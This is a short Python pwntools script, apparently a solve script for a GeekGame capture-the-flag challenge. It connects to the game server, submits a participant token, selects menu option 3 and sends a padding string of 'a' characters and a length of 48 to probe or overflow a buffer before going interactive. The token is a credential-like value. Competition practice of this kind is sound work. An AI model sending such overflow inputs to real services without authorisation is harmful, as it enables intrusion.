from pwn import *

conn = process(argv = ['nc', 'prob11.geekgame.pku.edu.cn', '10011'])

print(conn.recvuntil(b'token:'), end = '>\n')
conn.sendline(b'165:MEQCIAO8Cvf2ewr9c8j2xJV-2MKt019qD2WRxsITgGZxEv-aAiApyfqPGe_LnG5HPuSqMFZzFLumbfL6yfGLiFS2WrnJQw==')

print(conn.recvuntil(b'flag:'), end = '>\n')
conn.sendline(b'3')

# print(conn.recvuntil(b'bytes):'), end = '>\n')
conn.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')

# print(conn.recvuntil(b'buffer:'), end = '>\n')
conn.sendline(b'48')
conn.interactive()
